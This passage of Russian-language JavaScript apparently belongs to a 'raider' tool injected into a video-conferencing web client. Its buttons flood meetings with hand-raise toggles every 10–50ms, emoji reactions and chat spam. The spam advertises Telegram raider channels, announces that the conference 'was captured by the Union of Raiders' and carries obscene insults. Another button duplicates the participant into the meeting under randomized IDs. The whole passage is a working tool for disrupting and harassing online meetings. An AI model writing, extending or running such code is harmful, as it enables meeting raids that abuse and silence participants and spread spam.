            window.micTurboMode = turboToggle.checked;
    
            // Активируем соответствующие функции
            if (window.micAutoActivate) u();
            else u.stop();
    
            if (window.micTurboMode) window.startFastMicToggle();
            else window.stopFastMicToggle();
    
            promptDiv.style.opacity = '0';
            promptDiv.style.transform = 'translate(-50%, -50%) perspective(1000px) rotateX(15deg) scale(0.8)';
            setTimeout(() => promptDiv.remove(), 300);
        };
    
        cancelButton.onclick = () => {
            promptDiv.style.opacity = '0';
            promptDiv.style.transform = 'translate(-50%, -50%) perspective(1000px) rotateX(15deg) scale(0.8)';
            setTimeout(() => promptDiv.remove(), 300);
        };
    
        // Собираем элементы
        autoActivateLabel.appendChild(autoActivateText);
        autoActivateLabel.appendChild(autoActivateToggle);
        autoActivateContainer.appendChild(autoActivateLabel);
    
        turboLabel.appendChild(turboText);
        turboLabel.appendChild(turboToggle);
        turboContainer.appendChild(turboLabel);
    
        buttonContainer.appendChild(saveButton);
        buttonContainer.appendChild(cancelButton);
    
        // Собираем окно
        promptDiv.appendChild(title);
        promptDiv.appendChild(autoActivateContainer);
        promptDiv.appendChild(turboContainer);
        promptDiv.appendChild(buttonContainer);
        document.body.appendChild(promptDiv);
    
        // Анимация появления
        requestAnimationFrame(() => {
            promptDiv.style.opacity = '1';
            promptDiv.style.transform = 'translate(-50%, -50%) perspective(1000px) rotateX(0deg)';
        });
    })),
    
    // Кнопки управления микрофоном
    e.addButton(N, "🎤 Включить микрофон", !1, function() {
        n.sendSocketMessage({
            evt: n.packets.WS_AUDIO_MUTE_REQ,
            body: {
                id: n.state.meeting.currentUser.userId,
                bMute: false
            }
        })();
    }),
    
    e.addButton(N, "🔇 Выключить микрофон", !1, function() {
        n.sendSocketMessage({
            evt: n.packets.WS_AUDIO_MUTE_REQ,
            body: {
                id: n.state.meeting.currentUser.userId,
                bMute: true
            }
        })();
    }),
    
    e.addSeparator(N),
    e.addSubtitle(N, "СПАМ РУКИ"),

// Турбо спам рукой
e.addButton(N, "⚡ ЗАПУСК СПАМ РУКИ", !0, (function startTurboHandSpam() {
    if (!window.turboHandSpamInterval) {
        window.turboHandSpamInterval = setInterval(() => {
            a(); // Поднять руку
            setTimeout(i, 10); // Опустить руку через 10мс
        }, 20); // Интервал 20мс для максимальной скорости
    }
}), (function stopTurboHandSpam() {
    if (window.turboHandSpamInterval) {
        clearInterval(window.turboHandSpamInterval);
        window.turboHandSpamInterval = null;
    }
})),

// Комбо спам (рука + реакции + чат)
e.addButton(N, "✏️ НАСТРОЙКА КОМБО СПАМА", !0, (function editComboSpamMessages() {
    // Удаляем существующие окна, если они есть
    const existingPrompts = document.querySelectorAll('[data-prompt-type="combo-spam-settings"]');
    existingPrompts.forEach(prompt => prompt.remove());

    const promptDiv = document.createElement('div');
    promptDiv.setAttribute('data-prompt-type', 'combo-spam-settings');
    promptDiv.style.cssText = `
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%) perspective(1000px) rotateX(15deg);
        width: 450px;
        background: linear-gradient(145deg, rgba(40,40,55,0.98), rgba(25,25,35,0.98));
        backdrop-filter: blur(20px);
        color: #fff;
        padding: 35px;
        border-radius: 24px;
        box-shadow: 0 25px 60px rgba(0, 0, 0, 0.3),
                   0 0 100px rgba(82, 0, 255, 0.05),
                   inset 0 0 0 1px rgba(255,255,255,0.1);
        z-index: 999999;
        font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
        opacity: 0;
        transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1);
    `;

    // Заголовок
    const title = document.createElement('h2');
    title.textContent = 'Настройка комбо спама';
    title.style.cssText = `
        margin: 0 0 25px 0;
        font-size: 24px;
        font-weight: 600;
        text-align: center;
        color: #22C55E;
        transition: all 0.3s ease;
        cursor: default;
        opacity: 0;
        transform: translateY(-20px);
        animation: slideDown 0.5s ease forwards;
    `;

    title.onmouseover = () => {
        title.style.transform = 'scale(1.05)';
    };
    
    title.onmouseout = () => {
        title.style.transform = 'scale(1)';
    };

    // Текстовое поле
    const textarea = document.createElement('textarea');
    textarea.value = window.comboSpamMessages?.join('\n') || 
        "Мой тг: https://t.me/NearIyEpoint\nМой тг: https://t.me/NearIyEpoint\nМой тг: https://t.me/NearIyEpoint\nМой тг: https://t.me/NearIyEpoint\nМой тг: https://t.me/NearIyEpoint\nМой тг: https://t.me/NearIyEpoint\nМой тг: https://t.me/NearIyEpoint\nМой тг: https://t.me/NearIyEpoint\nМой тг: https://t.me/NearIyEpoint\nМой тг: https://t.me/NearIyEpoint";
    textarea.style.cssText = `
        width: 100%;
        height: 200px;
        padding: 12px;
        background: rgba(255,255,255,0.05);
        border: 2px solid rgba(255,255,255,0.1);
        border-radius: 12px;
        color: white;
        font-size: 15px;
        margin-bottom: 20px;
        outline: none;
        resize: vertical;
        transition: all 0.3s ease;
        box-sizing: border-box;
        opacity: 0;
        transform: translateY(20px);
        animation: slideUp 0.5s ease 0.2s forwards;
    `;

    // Кнопки
    const buttonContainer = document.createElement('div');
    buttonContainer.style.cssText = `
        display: flex;
        justify-content: center;
        gap: 10px;
        opacity: 0;
        transform: translateY(20px);
        animation: slideUp 0.5s ease 0.4s forwards;
    `;

    const saveButton = document.createElement('button');
    saveButton.textContent = 'Сохранить';
    saveButton.style.cssText = `
        padding: 12px 24px;
        background: #22C55E;
        color: white;
        border: none;
        border-radius: 12px;
        font-size: 14px;
        font-weight: 500;
        cursor: pointer;
        transition: all 0.3s ease;
        box-shadow: 0 0 15px rgba(34, 197, 94, 0.3);
    `;

    const cancelButton = document.createElement('button');
    cancelButton.textContent = 'Отмена';
    cancelButton.style.cssText = `
        padding: 12px 24px;
        background: transparent;
        color: rgb(34, 197, 94);
        border: 2px solid rgb(34, 197, 94);
        border-radius: 12px;
        font-size: 14px;
        font-weight: 500;
        cursor: pointer;
        transition: all 0.3s ease;
    `;

    // Добавляем анимации при наведении
    saveButton.onmouseover = () => {
        saveButton.style.background = 'linear-gradient(135deg, #22C55E, #16A34A)';
        saveButton.style.transform = 'scale(1.05)';
        saveButton.style.boxShadow = '0 0 25px rgba(34, 197, 94, 0.5)';
    };
    saveButton.onmouseout = () => {
        saveButton.style.background = '#22C55E';
        saveButton.style.transform = 'scale(1)';
        saveButton.style.boxShadow = '0 0 15px rgba(34, 197, 94, 0.3)';
    };

    cancelButton.onmouseover = () => {
        cancelButton.style.background = 'rgba(34, 197, 94, 0.1)';
        cancelButton.style.transform = 'scale(1.05)';
    };
    cancelButton.onmouseout = () => {
        cancelButton.style.background = 'transparent';
        cancelButton.style.transform = 'scale(1)';
    };

    saveButton.onclick = () => {
        window.comboSpamMessages = textarea.value.split('\n').filter(msg => msg.trim());
        promptDiv.style.opacity = '0';
        promptDiv.style.transform = 'translate(-50%, -50%) perspective(1000px) rotateX(15deg) scale(0.8)';
        setTimeout(() => promptDiv.remove(), 300);
    };

    cancelButton.onclick = () => {
        promptDiv.style.opacity = '0';
        promptDiv.style.transform = 'translate(-50%, -50%) perspective(1000px) rotateX(15deg) scale(0.8)';
        setTimeout(() => promptDiv.remove(), 300);
    };

    buttonContainer.appendChild(saveButton);
    buttonContainer.appendChild(cancelButton);

    promptDiv.appendChild(title);
    promptDiv.appendChild(textarea);
    promptDiv.appendChild(buttonContainer);
    document.body.appendChild(promptDiv);

    // Добавляем стили анимаций
    const style = document.createElement('style');
    style.textContent = `
        @keyframes slideDown {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
    `;
    document.head.appendChild(style);

    // Анимация появления
    requestAnimationFrame(() => {
        promptDiv.style.opacity = '1';
        promptDiv.style.transform = 'translate(-50%, -50%) perspective(1000px) rotateX(0deg)';
    });
})),

e.addButton(N, "🔄 КОМБО СПАМ", !0, (function startComboSpam() {
    if (!window.comboSpamInterval) {
        const messages = window.comboSpamMessages || [
            "ПОДНЯЛ РУКУ! ✋",
            "ДАЙТЕ СЛОВО! 🗣️",
            "ПРОШУ ВНИМАНИЯ! ⚡",
            "СПРОСИТЬ МОЖНО? 🤔",
            "ВНИМАНИЕ! ❗",
            "РАЗРЕШИТЕ СКАЗАТЬ! 📢",
            "ПОДНИМАЮ РУКУ! 🖐️",
            "ЕСТЬ ВОПРОС! ❓",
            "ПРОШУ СЛОВА! 🎤",
            "МОЖНО ВЫСКАЗАТЬСЯ? 💭"
        ];

        window.comboSpamInterval = setInterval(() => {
            // Спам рукой
            a();
            setTimeout(i, 50);

            // Спам реакциями
            l(window.reactionList[Math.floor(Math.random() * window.reactionList.length)]);

            // Спам в чат
            c(messages[Math.floor(Math.random() * messages.length)]);
        }, 100);
    }
}), (function stopComboSpam() {
    if (window.comboSpamInterval) {
        clearInterval(window.comboSpamInterval);
        window.comboSpamInterval = null;
    }
})),

// Агрессивный спам рукой и реакциями
e.addButton(N, "💥 АГРЕССИВНЫЙ СПАМ", !0, (function startAggressiveSpam() {
    if (!window.aggressiveSpamInterval) {
        const reactions = ["😡", "💢", "🔥", "⚡", "💥", "❗", "⚠️", "🚨"];
        const messages = [
            "ЗАЙДИТЕ НА МОЙ ТГ: https://t.me/NearIyEpoint И НА НАШ ТЕЛЕГРАМ https://t.me/srivzoomkonf",
        ];

        window.aggressiveSpamInterval = setInterval(() => {
            // Быстрый спам рукой
            a();
            setTimeout(i, 30);
            
            // Спам агрессивными реакциями
            l(reactions[Math.floor(Math.random() * reactions.length)]);
            
            // Спам сообщениями в чат
            if (Math.random() < 0.3) { // 30% шанс отправки сообщения
                c(messages[Math.floor(Math.random() * messages.length)]);
            }
        }, 50);
    }
}), (function stopAggressiveSpam() {
    if (window.aggressiveSpamInterval) {
        clearInterval(window.aggressiveSpamInterval);
        window.aggressiveSpamInterval = null;
    }
})),
    e.addSeparator(N),
    e.addSubtitle(N, "ПАРАМЕТРЫ СКОРОСТИ ПОДНЯТИЯ РУКИ"),

// Добавляем новую кнопку настройки перед турбо спамом
e.addButton(N, "⚙️ НАСТРОЙКА СПАМА РУКИ", !0, (function editHandSpamSettings() {
    // Удаляем существующие окна
    const existingPrompts = document.querySelectorAll('[data-prompt-type="hand-spam-settings"]');
    existingPrompts.forEach(prompt => prompt.remove());

    const promptDiv = document.createElement('div');
    promptDiv.setAttribute('data-prompt-type', 'hand-spam-settings');
    promptDiv.style.cssText = `
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%) perspective(1000px) rotateX(15deg);
        width: 450px;
        background: linear-gradient(145deg, rgba(40,40,55,0.98), rgba(25,25,35,0.98));
        backdrop-filter: blur(20px);
        color: #fff;
        padding: 35px;
        border-radius: 24px;
        box-shadow: 0 25px 60px rgba(0, 0, 0, 0.3),
                   0 0 100px rgba(82, 0, 255, 0.05),
                   inset 0 0 0 1px rgba(255,255,255,0.1);
        z-index: 999999;
        font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
        opacity: 0;
        transition: all 0.6s cubic-bezier(0.16, 1, 0.3, 1);
    `;

    // Заголовок
    const title = document.createElement('h2');
    title.textContent = 'Настройка спама руки';
    title.style.cssText = `
        margin: 0 0 25px 0;
        font-size: 24px;
        font-weight: 600;
        text-align: center;
        background: linear-gradient(135deg, #22C55E, #16A34A);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
    `;

    // Создаем слайдер для интервала
    const sliderContainer = document.createElement('div');
    sliderContainer.style.cssText = `
        margin-bottom: 20px;
    `;

    const sliderLabel = document.createElement('label');
    sliderLabel.textContent = 'Как часто поднимать руку (в миллисекундах):';
    sliderLabel.style.cssText = `
        display: block;
        margin-bottom: 10px;
        color: #fff;
        font-size: 14px;
    `;

    const slider = document.createElement('input');
    slider.type = 'range';
    slider.min = '10';
    slider.max = '1000';
    slider.value = window.handSpamInterval || '20';
    slider.style.cssText = `
        width: 100%;
        margin: 10px 0;
        accent-color: #22C55E;
    `;

    const sliderValue = document.createElement('div');
    sliderValue.textContent = `${slider.value}мс`;
    sliderValue.style.cssText = `
        text-align: center;
        color: #22C55E;
        font-size: 14px;
        margin-bottom: 20px;
    `;

    slider.oninput = () => {
        sliderValue.textContent = `${slider.value}мс`;
    };

    // Добавляем новый переключатель для режима случайности
    const randomModeContainer = document.createElement('div');
    randomModeContainer.style.cssText = `
        margin-bottom: 20px;
        padding: 15px;
        background: rgba(255,255,255,0.05);
        border-radius: 12px;
    `;

    const randomModeLabel = document.createElement('label');
    randomModeLabel.style.cssText = `
        display: flex;
        align-items: center;
        justify-content: space-between;
        color: #fff;
        font-size: 14px;
    `;

    const randomModeText = document.createElement('span');
    randomModeText.textContent = 'Случайный интервал (±50%):';

    const randomModeToggle = document.createElement('input');
    randomModeToggle.type = 'checkbox';
    randomModeToggle.checked = window.handSpamRandomMode || false;
    randomModeToggle.style.cssText = `
        width: 40px;
        height: 20px;
        appearance: none;
        background: rgba(255,255,255,0.1);
        border-radius: 20px;
        position: relative;
        cursor: pointer;
        transition: all 0.3s ease;
    `;

    // Добавляем новый переключатель для режима "Двойное нажатие"
    const doubleClickContainer = document.createElement('div');
    doubleClickContainer.style.cssText = `
        margin-bottom: 20px;
        padding: 15px;
        background: rgba(255,255,255,0.05);
        border-radius: 12px;
    `;

    const doubleClickLabel = document.createElement('label');
    doubleClickLabel.style.cssText = `
        display: flex;
        align-items: center;
        justify-content: space-between;
        color: #fff;
        font-size: 14px;
    `;

    const doubleClickText = document.createElement('span');
    doubleClickText.textContent = 'Двойное нажатие руки:';

    const doubleClickToggle = document.createElement('input');
    doubleClickToggle.type = 'checkbox';
    doubleClickToggle.checked = window.handSpamDoubleClick || false;
    doubleClickToggle.style.cssText = `
        width: 40px;
        height: 20px;
        appearance: none;
        background: rgba(255,255,255,0.1);
        border-radius: 20px;
        position: relative;
        cursor: pointer;
        transition: all 0.3s ease;
    `;

    // Добавляем новый переключатель для режима "Зигзаг"
    const zigzagContainer = document.createElement('div');
    zigzagContainer.style.cssText = `
        margin-bottom: 20px;
        padding: 15px;
        background: rgba(255,255,255,0.05);
        border-radius: 12px;
    `;

    const zigzagLabel = document.createElement('label');
    zigzagLabel.style.cssText = `
        display: flex;
        align-items: center;
        justify-content: space-between;
        color: #fff;
        font-size: 14px;
    `;

    const zigzagText = document.createElement('span');
    zigzagText.textContent = 'Режим зигзага (волнообразный спам):';

    const zigzagToggle = document.createElement('input');
    zigzagToggle.type = 'checkbox';
    zigzagToggle.checked = window.handSpamZigzag || false;
    zigzagToggle.style.cssText = `
        width: 40px;
        height: 20px;
        appearance: none;
        background: rgba(255,255,255,0.1);
        border-radius: 20px;
        position: relative;
        cursor: pointer;
        transition: all 0.3s ease;
    `;

    // Добавляем новый переключатель для режима "Хаотичный спам"
    const chaosContainer = document.createElement('div');
    chaosContainer.style.cssText = `
        margin-bottom: 20px;
        padding: 15px;
        background: rgba(255,255,255,0.05);
        border-radius: 12px;
    `;

    const chaosLabel = document.createElement('label');
    chaosLabel.style.cssText = `
        display: flex;
        align-items: center;
        justify-content: space-between;
        color: #fff;
        font-size: 14px;
    `;

    const chaosText = document.createElement('span');
    chaosText.textContent = 'Хаотичный режим (случайные паузы):';

    const chaosToggle = document.createElement('input');
    chaosToggle.type = 'checkbox';
    chaosToggle.checked = window.handSpamChaos || false;
    chaosToggle.style.cssText = `
        width: 40px;
        height: 20px;
        appearance: none;
        background: rgba(255,255,255,0.1);
        border-radius: 20px;
        position: relative;
        cursor: pointer;
        transition: all 0.3s ease;
    `;

    const toggleStyle = document.createElement('style');
    toggleStyle.textContent = `
        input[type="checkbox"]:checked {
            background: #22C55E;
        }
        input[type="checkbox"]::before {
            content: '';
            position: absolute;
            width: 16px;
            height: 16px;
            border-radius: 50%;
            background: white;
            top: 2px;
            left: 2px;
            transition: all 0.3s ease;
        }
        input[type="checkbox"]:checked::before {
            transform: translateX(20px);
        }
    `;
    document.head.appendChild(toggleStyle);

    // Контейнер для кнопок
    const buttonContainer = document.createElement('div');
    buttonContainer.style.cssText = `
        display: flex;
        justify-content: center;
        gap: 10px;
        margin-top: 20px;
    `;

    // Кнопки
    const saveButton = document.createElement('button');
    saveButton.textContent = 'Сохранить';
    saveButton.style.cssText = `
        padding: 12px 24px;
        background: #22C55E;
        color: white;
        border: none;
        border-radius: 12px;
        font-size: 14px;
        font-weight: 500;
        cursor: pointer;
        transition: all 0.3s ease;
        box-shadow: 0 0 15px rgba(34, 197, 94, 0.3);
    `;

    const cancelButton = document.createElement('button');
    cancelButton.textContent = 'Отмена';
    cancelButton.style.cssText = `
        padding: 12px 24px;
        background: transparent;
        color: rgb(34, 197, 94);
        border: 2px solid rgb(34, 197, 94);
        border-radius: 12px;
        font-size: 14px;
        font-weight: 500;
        cursor: pointer;
        transition: all 0.3s ease;
    `;

    // Добавляем эффекты наведения
    saveButton.onmouseover = () => {
        saveButton.style.background = 'linear-gradient(135deg, #22C55E, #16A34A)';
        saveButton.style.transform = 'scale(1.05)';
        saveButton.style.boxShadow = '0 0 25px rgba(34, 197, 94, 0.5)';
    };
    saveButton.onmouseout = () => {
        saveButton.style.background = '#22C55E';
        saveButton.style.transform = 'scale(1)';
        saveButton.style.boxShadow = '0 0 15px rgba(34, 197, 94, 0.3)';
    };

    cancelButton.onmouseover = () => {
        cancelButton.style.background = 'rgba(34, 197, 94, 0.1)';
        cancelButton.style.transform = 'scale(1.05)';
    };
    cancelButton.onmouseout = () => {
        cancelButton.style.background = 'transparent';
        cancelButton.style.transform = 'scale(1)';
    };

    // Обработчики кнопок
    saveButton.onclick = () => {
        window.handSpamInterval = parseInt(slider.value);
        window.handSpamRandomMode = randomModeToggle.checked;
        window.handSpamDoubleClick = doubleClickToggle.checked;
        window.handSpamZigzag = zigzagToggle.checked;
        window.handSpamChaos = chaosToggle.checked;
        promptDiv.style.opacity = '0';
        promptDiv.style.transform = 'translate(-50%, -50%) perspective(1000px) rotateX(15deg) scale(0.8)';
        setTimeout(() => promptDiv.remove(), 300);
    };

    cancelButton.onclick = () => {
        promptDiv.style.opacity = '0';
        promptDiv.style.transform = 'translate(-50%, -50%) perspective(1000px) rotateX(15deg) scale(0.8)';
        setTimeout(() => promptDiv.remove(), 300);
    };

    // Собираем все элементы
    randomModeLabel.appendChild(randomModeText);
    randomModeLabel.appendChild(randomModeToggle);
    randomModeContainer.appendChild(randomModeLabel);

    doubleClickLabel.appendChild(doubleClickText);
    doubleClickLabel.appendChild(doubleClickToggle);
    doubleClickContainer.appendChild(doubleClickLabel);

    zigzagLabel.appendChild(zigzagText);
    zigzagLabel.appendChild(zigzagToggle);
    zigzagContainer.appendChild(zigzagLabel);

    chaosLabel.appendChild(chaosText);
    chaosLabel.appendChild(chaosToggle);
    chaosContainer.appendChild(chaosLabel);

    sliderContainer.appendChild(sliderLabel);
    sliderContainer.appendChild(slider);
    sliderContainer.appendChild(sliderValue);
    buttonContainer.appendChild(saveButton);
    buttonContainer.appendChild(cancelButton);
    promptDiv.appendChild(title);
    promptDiv.appendChild(sliderContainer);
    promptDiv.appendChild(randomModeContainer);
    promptDiv.appendChild(doubleClickContainer);
    promptDiv.appendChild(zigzagContainer);
    promptDiv.appendChild(chaosContainer);
    promptDiv.appendChild(buttonContainer);
    document.body.appendChild(promptDiv);

    // анимация появления
    requestAnimationFrame(() => {
        promptDiv.style.opacity = '1';
        promptDiv.style.transform = 'translate(-50%, -50%) perspective(1000px) rotateX(0deg)';
    });
})),

// Добавляем кнопку настройки спама реакций
e.addButton(N, "⚙️ НАСТРОЙКА СПАМА РЕАКЦИЙ", !0, (function editReactionSpamSettings() {
    const existingPrompts = document.querySelectorAll('[data-prompt-type="reaction-spam-settings"]');
    existingPrompts.forEach(prompt => prompt.remove());

    const promptDiv = document.createElement('div');
    promptDiv.setAttribute('data-prompt-type', 'reaction-spam-settings');
    promptDiv.style.cssText = `
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        width: 450px;
        background: linear-gradient(145deg, rgba(40,40,55,0.98), rgba(25,25,35,0.98));
        color: #fff;
        padding: 35px;
        border-radius: 24px;
        box-shadow: 0 25px 60px rgba(0,0,0,0.3);
        z-index: 999999;
    `;

    const title = document.createElement('h2');
    title.textContent = 'Настройка спама реакций';
    title.style.cssText = `
        margin: 0 0 25px 0;
        text-align: center;
        color: #22C55E;
    `;

    const selectionButtons = document.createElement('div');
    selectionButtons.style.cssText = `
        display: flex;
        justify-content: center;
        gap: 10px;
        margin-bottom: 15px;
    `;

    const selectAllButton = document.createElement('button');
    selectAllButton.textContent = 'Выбрать все';
    selectAllButton.style.cssText = `
        padding: 8px 16px;
        background: rgba(34, 197, 94, 0.2);
        color: #22C55E;
        border: 1px solid #22C55E;
        border-radius: 8px;
        cursor: pointer;
    `;

    const deselectAllButton = document.createElement('button');
    deselectAllButton.textContent = 'Убрать все';
    deselectAllButton.style.cssText = `
        padding: 8px 16px;
        background: rgba(239, 68, 68, 0.2);
        color: #EF4444;
        border: 1px solid #EF4444;
        border-radius: 8px;
        cursor: pointer;
    `;

    const emojiContainer = document.createElement('div');
    emojiContainer.style.cssText = `
        display: grid;
        grid-template-columns: repeat(4, 1fr);
        gap: 10px;
        margin-bottom: 20px;
    `;

    const defaultEmojis = ["😀", "😂", "❤️", "👍", "🎉", "🔥", "⭐", "💯", "🌟", "✨", "💫", "💥", "🎯", "🎨", "🎭", "🎪", "🎡", "🎢", "🎠", "🎮", "🕹️", "🎲", "🎰", "🎳", "🎯", "🎱", "🎸", "🎼", "🎧", "🎤", "🎬", "🎨", "🎭", "🎪", "🇷🇺", "🦄"];
    window.selectedEmojis = window.selectedEmojis || defaultEmojis;

    const emojiButtons = [];
    defaultEmojis.forEach(emoji => {
        const emojiButton = document.createElement('button');
        emojiButton.textContent = emoji;
        emojiButton.style.cssText = `
            padding: 10px;
            font-size: 24px;
            border: 2px solid ${window.selectedEmojis.includes(emoji) ? '#22C55E' : 'transparent'};
            background: rgba(255,255,255,0.1);
            border-radius: 8px;
            cursor: pointer;
        `;
        
        emojiButton.onclick = () => {
            if (window.selectedEmojis.includes(emoji)) {
                window.selectedEmojis = window.selectedEmojis.filter(e => e !== emoji);
                emojiButton.style.border = '2px solid transparent';
            } else {
                window.selectedEmojis.push(emoji);
                emojiButton.style.border = '2px solid #22C55E';
            }
        };
        
        emojiButtons.push(emojiButton);
        emojiContainer.appendChild(emojiButton);
    });

    selectAllButton.onclick = () => {
        window.selectedEmojis = [...defaultEmojis];
        emojiButtons.forEach(button => {
            button.style.border = '2px solid #22C55E';
        });
    };

    deselectAllButton.onclick = () => {
        window.selectedEmojis = [];
        emojiButtons.forEach(button => {
            button.style.border = '2px solid transparent';
        });
    };

    const buttonContainer = document.createElement('div');
    buttonContainer.style.cssText = `
        display: flex;
        justify-content: center;
        gap: 10px;
        margin-top: 20px;
    `;

    const saveButton = document.createElement('button');
    saveButton.textContent = 'Сохранить';
    saveButton.onclick = () => promptDiv.remove();
    saveButton.style.cssText = `
        padding: 12px 24px;
        background: #22C55E;
        color: white;
        border: none;
        border-radius: 12px;
        cursor: pointer;
    `;

    selectionButtons.appendChild(selectAllButton);
    selectionButtons.appendChild(deselectAllButton);
    buttonContainer.appendChild(saveButton);
    promptDiv.appendChild(title);
    promptDiv.appendChild(selectionButtons);
    promptDiv.appendChild(emojiContainer);
    promptDiv.appendChild(buttonContainer);
    document.body.appendChild(promptDiv);
})),

// Кнопка запуска спама реакций
e.addButton(N, "🎯 ЗАПУСК СПАМА РЕАКЦИЙ", !0, (function startReactionSpam() {
    if (!window.reactionSpamInterval) {
        window.reactionSpamInterval = setInterval(() => {
            const selectedEmojis = window.selectedEmojis || ["😀", "😂", "❤️", "👍", "🎉", "🔥", "⭐", "💯"];
            const randomEmoji = selectedEmojis[Math.floor(Math.random() * selectedEmojis.length)];
            l(randomEmoji);
        }, 100);
    }
}), (function stopReactionSpam() {
    if (window.reactionSpamInterval) {
        clearInterval(window.reactionSpamInterval);
        window.reactionSpamInterval = null;
    }
})),

// Обновляем существующую функцию турбо спама
e.addButton(N, "⚡ ЗАПУСК СПАМА РУКОЙ", !0, (function startTurboHandSpam() {
    if (!window.turboHandSpamInterval) {
        const interval = window.handSpamInterval || 20; // Используем сохраненный интервал
        window.turboHandSpamInterval = setInterval(() => {
            if (window.handSpamChaos && Math.random() < 0.3) {
                setTimeout(() => {
                    a(); // Поднять руку с задержкой
                    setTimeout(i, 10);
                }, Math.random() * 500);
            } else {
                a(); // Поднять руку
                setTimeout(i, 10); // Опустить руку через 10мс
            }
        }, interval);
    }
}), (function stopTurboHandSpam() {
    if (window.turboHandSpamInterval) {
        clearInterval(window.turboHandSpamInterval);
        window.turboHandSpamInterval = null;
    }
})),
    e.addSeparator(N),
    e.addSubtitle(N, "ДУБЛИРОВАНИЕ КОНФЕРЕНЦИИ"),
    e.addButton(N, "💫 Дублировать конференцию", !0, (function() {
        !function(e) {
            localStorage.clear();
            var t = document.querySelector("#webclient");
            if (t) {
                window.meetingURL = window.meetingURL || t.src;
                for (var n = 0; n < e; n++) {
                    var r = window.open(meetingURL, "_blank");
                    (r.webpackChunkwebclient = r.webpackChunkwebclient || []).push([[Symbol()], {}, function(e) {
                        e(22665).$c.webClient_meetingUqiueId = Math.random().toString(36).substring(2, 7)
                    }
                    ]),
                    r.focus()
                }
            } else
                console.error("Element with ID 'webclient' not found.")
        }(1)
    }
    )),
    e.addSeparator(N),
    e.addSubtitle(N, "ШАБЛОНЫ СПАМА"),
    e.addButton(N, "🖇️ ССЫЛКИ НА ТГ ГРУППЫ РЕЙДЕРОВ", !0, (function startAdSpam() {
    if (!window.adSpamInterval) {
        const adTexts = [
            "☭РАБОТАЕТ СОЮЗ РЕЙДЕРОВ! МОРДАМИ В ПОЛ, ШАВКИ!☭ https://t.me/SOUZREIDEROV_4AT ☭вы захвачены союзом рейдеров!☭",
            "🦅🪽 https://t.me/srivzoomkonf 🦅🪽 https://t.me/srivzoomkonf 🦅🪽",
            "❗️❗️⚠️⚠️⚠️У ВАС ПЕРХОТЬ ГОРИТ❗️⚠️⚠️⚠️ СРОЧНО ВКЛЮЧИТЕ РЕЖИМ ПОЛЁТА⚠️⚠️⚠️⚠️⚠️❗️❗️❗️☣️☣️☣️📴📴📳📳📳🆘🆘🆘🅱️⛔️📛📛💯💯♨️♨️💢‼️‼️⚠️⚠️🚸🚸 ❗️❗️⚠️⚠️⚠️У ВАС ПЕРХОТЬ ГОРИТ❗️⚠️⚠️⚠️ СРОЧНО ВКЛЮЧИТЕ РЕЖИМ ПОЛЁТА⚠️⚠️⚠️⚠️⚠️❗️❗️❗️☣️☣️☣️📴📴📳📳📳🆘🆘🆘🅱️⛔️📛📛💯💯♨️♨️💢‼️‼️⚠️⚠️🚸🚸❗️❗️⚠️⚠️⚠️У ВАС ПЕРХОТЬ ГОРИТ❗️⚠️⚠️⚠️ СРОЧНО ВКЛЮЧИТЕ РЕЖИМ ПОЛЁТА⚠️⚠️⚠️⚠️⚠️❗️❗️❗️☣️☣️☣️📴📴📳📳📳🆘🆘🆘🅱️⛔️📛📛💯💯♨️♨️💢‼️‼️⚠️⚠️🚸🚸",
            "⚠️⚠️😡⚠️ КОНФЕРЕНЦИЯ БЫЛА ЗАХВАЧЕНА СОЮЗОМ РЕЙДЕРОВ! ⚠️😡⚠️⚠️ https://t.me/srivzoomkonf ⚠️😡⚠️⚠️",
            "🏃‍♂️🏃‍♂️ВОН 💃 НАХУЙ С КОНФЕРЕНЦИИ 🦅🪽https://t.me/srivzoomkonf 💃🚨🚨🙏",
            "ЗАБИРАЙ ПИЗДЮЛЕЙ ТУТ https://t.me/srivzoomkonf VIP ДОСТУП БЕСПЛАТНО! 💫",
        ];

        window.adSpamInterval = setInterval(() => {
            c(adTexts[Math.floor(Math.random() * adTexts.length)]);
        }, 0);
    }
}), (function stopAdSpam() {
    if (window.adSpamInterval) {
        clearInterval(window.adSpamInterval);
        window.adSpamInterval = null;
    }
})),

e.addButton(N, "🩻 УЖАСНЫЙ СПАМ", !0, h, h.stop),
e.addButton(N, "⚠️ БЕЩАСТЬ СПАМ", !0, (function startThreatSpam() {
    if (!window.threatSpamInterval) {
        const threatTexts = [
            "Царь на хуе❗️❗️‼️‼️‼️‼️‼️‼️‼️😳😳😳😳😳😳😳царь на хуе❗️‼️😳🐌‼️‼️😳‼️ Царь на хуе❗️❗️‼️‼️‼️‼️‼️‼️‼️😳😳😳😳😳😳😳царь на хуе❗️‼️😳🐌‼️‼️😳‼️Царь на хуе❗️❗️‼️‼️‼️‼️‼️‼️‼️😳😳😳😳😳😳😳царь на хуе❗️‼️😳🐌‼️‼️😳‼️Царь на хуе❗️❗️‼️‼️‼️‼️‼️‼️‼️😳😳😳😳😳😳😳царь на хуе❗️‼️😳🐌‼️‼️😳‼️",
